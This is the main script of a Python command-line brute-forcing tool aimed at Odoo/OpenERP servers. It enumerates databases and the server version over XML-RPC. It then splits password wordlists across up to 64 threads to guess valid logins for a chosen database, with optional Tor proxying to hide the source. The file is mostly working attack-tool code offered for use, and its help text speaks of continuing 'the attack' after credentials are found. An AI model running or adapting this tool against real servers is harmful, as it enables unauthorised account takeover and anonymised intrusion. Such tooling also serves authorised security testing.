#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import sys
import time
import datetime
import logging
import xmlrpclib as xrl
import builtins

from utils.file.filehandler import FileHandler
from utils.format.color import color
from utils.format.output import Output
from utils.functions.generic import *
from utils.timer.processtimer import ProcessTimer
from net.proxy.TorProxySupport import TorProxySupport
from worker.worker_thread import WorkerThread

Color = color()
# Default max connections on openerp.conf is 64
max_threads = 64
min_threads = [2]

current_version = "0.7.8"

ptimer = ProcessTimer()
time.sleep(0.1)

p = argparse.ArgumentParser(
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=show_epilog_examples(sys.argv[0])
)

p.add_argument("-v", action='store_true', help="Show current version")
p.add_argument("-q", action='store_true', help="Do not print the banner")
p.add_argument("-vv", action='store_true',
    help="Verbose mode (default false). Inaccurate using threads",
    default=False)
p.add_argument("--log", nargs=1, metavar="logfile",
                help="Log all output to the path (overwrite). "
                "Note: can be used without -vv, "
                "verbose output will be included in log")


group1 = p.add_argument_group('Enumeration')
group1.add_argument('--enum-db', action='store_true',
                    help='Enumerate, if possible, all databases')
group1.add_argument('--enum-version', action='store_true',
                    help='Enumerate odoo\'s version')

group2 = p.add_argument_group('Options')
group2.add_argument("--db", nargs=1, type=str,
                    help="""Target Odoo database.
                    Example: --db=db1 or --db db1""")
group2.add_argument("-u", "--users",
                    metavar="USERFILE", dest="usrfile", nargs=1,
                    type=str, help="Path to USERNAMES wordlist")
group2.add_argument("-p", "--pass", dest="pwdfile", metavar="PASSFILE", nargs=1,
                     type=str, help="Path to PASSWORDS wordlist")
group2.add_argument("-c", action="store_true",
    help="""Continue the attack even after
    having found a valid user and password""",
    default=False)
group2.add_argument("-t", "--threads", nargs=1, metavar="Threads",
    help="Number of threads, default 2 - max 64",
    default=min_threads, type=int)

group3 = p.add_argument_group('Proxy')
group3.add_argument('--tor', nargs=1,
                    help='Use tor proxy. Example: --tor=localhost:9050 or --tor localhost:9050')

group4 = p.add_argument_group('Parameters')
group4.add_argument("host", nargs=1, type=str,
    help="Odoo server Hostname or IP Address")
group4.add_argument("port", nargs=1, type=str,
    help="Odoo server Port to connect")


if ("-q" not in sys.argv):
    show_banner(current_version)


args = p.parse_args()
# Setting to the output class our verbose mode
output = Output(args.vv)

try:

    if (args.v):
        output.out(("\n- Current version is: {0}\n")
            .format(Color.bold(current_version)), True)
        p.print_usage()
        sys.exit(0)

    if (args.log):
        logging.basicConfig(format='%(levelname)s %(asctime)s: %(message)s',
            filename=args.log[0], filemode='w',
            level=logging.DEBUG)

    # Non optional parameters
    if args.host:
        server = args.host[0]
    else:
        p.error("[-] Error while connecting to the server. Host undefined")
    if args.port:
        port = int(args.port[0])
    else:
        p.error("[-] Error while connecting to the server. Port undefined")

    # Enabling proxy support if necessary
    if (args.tor):
        output.out('[+] Enabling TOR proxy support...', force_show=True)
        tor = TorProxySupport(args.tor[0])
        tor.set()

    # Checking connection before any action
    output.out('[+] Checking connection')
    res = check_url(server, port, args.vv)
    if res is False:
        output.error("[-] Could not connect to {0}:{1}. "
            "Server:port or Proxy incorrect?".format(server, port))
        output.error("[-] Try again...")
        sys.exit(1)
    else:
        output.out('[+] Connection established')

    # Single action, database enumeration and exit
    if (args.enum_db):

        output.out('[+] Trying to enumerate databases...')
        db_url = "http://{0}:{1}/xmlrpc/2/db".format(server, port)
        db_obj = xrl.ServerProxy("{0}".format(db_url))

        db_list = db_obj.list()

        if (len(db_list) > 0):

            output.out(("[+] {0} {1}")
                .format(
                    Color.warning(len(db_list)),
                    Color.bold("databases found! Listing: ")
                )
            )

            for db in db_list:
                output.out(("{0}")
                    .format(
                        Color.warning("\t- {0}".format(db))
                    ), force_show=True)

                time.sleep(0.2)
            output.out("\n", force_show=True)

        sys.exit(0)

    # Single action, Odoo version enumeration and exit
    elif(args.enum_version):

        output.out('[+] Trying to fetching Odoo version...')
        output.out("[+] URL => http://{0}:{1}/xmlrpc/2/db".format(server, port))

        db_url = "http://{0}:{1}/xmlrpc/2/db".format(server, port)
        db_obj = xrl.ServerProxy("{0}".format(db_url))

        output.out("[+] Odoo Server Version {0}\n"
            .format(Color.bold(db_obj.server_version())),
        force_show=True)

        sys.exit(0)

    # Starting dictionary attack
    elif(args.db):

        if (not args.c):
            output.out("[+] Process will stop after found "
                "a valid username and password!", force_show=True)

        if (not args.usrfile):
            p.error('[-] Error while parsing username: use -u/--users')

        if (not args.pwdfile):
            p.error('[-] Error while parsing username: use -p/--pass')

        if (args.threads):

            threads = args.threads[0] if args.threads[0] > 0 else min_threads
            if threads > max_threads:
                p.error("[-] Error while creating threads:"
                "Max threads are {0} due to default openerp "
                " max connection"
                    .format(max_threads))

            output.out("[+] Starting main process: {0}"
                .format(str(datetime.datetime.now())), force_show=True)

            output.out('[+] Creating {0} threads...'
                .format(threads), force_show=True)

            fh = FileHandler()
            number_lines = fh.get_total_lines(args.pwdfile[0])

            output.out("[+] Total users: {0}"
                .format(fh.get_total_lines(args.usrfile[0])), force_show=True)
            output.out("[+] Total passwords: {0}\n"
                .format(number_lines), force_show=True)

            list_threads = []

            # Global flag to stop all threads
            builtins.run_main_app = True

            if (number_lines >= threads):
                # passwords per thread
                block = number_lines / threads

                for i in range(threads):

                    # Divides the file by threads
                    # And sets start and stop for each one
                    thread_id = i
                    start_from = i * block
                    stop_at = ((i + 1) * block) - 1

                    # If is last thread, then stop at the end of the file
                    if (i == threads - 1):
                        stop_at = number_lines - 1

                    worker = WorkerThread(thread_id, start_from, stop_at, args)
                    worker.start()

                    list_threads.append(worker)

                # Block main thread till all threads finish
                for t in list_threads:
                    t.join()


                output.out("\n[+] Main process finished at: {0}"
                    .format(str(datetime.datetime.now())), force_show=True)
                output.out("[+] Elapsed: {0}"
                    .format(ptimer.get_time()), force_show=True)

                sys.exit(0)

            else:
                output.error("[-] Error while executing threads: "
                "Please decrease your number of "
                "threads: More threads than lines")

    else:
        p.error("[-] Error while trying to connect "
            "on db: no database or action provided\n")

except xrl.Fault as xml_fault:
    code = xml_fault.faultCode
    message = xml_fault.faultString
    if (code == 3):
        output.error("[-] Error while executing the query: Access Denied")
        sys.exit(1)
    else:
        output.error(('[-] Unhandled XMLRPC Exception: {0} {1}')
                .format(code, message))
        sys.exit(1)
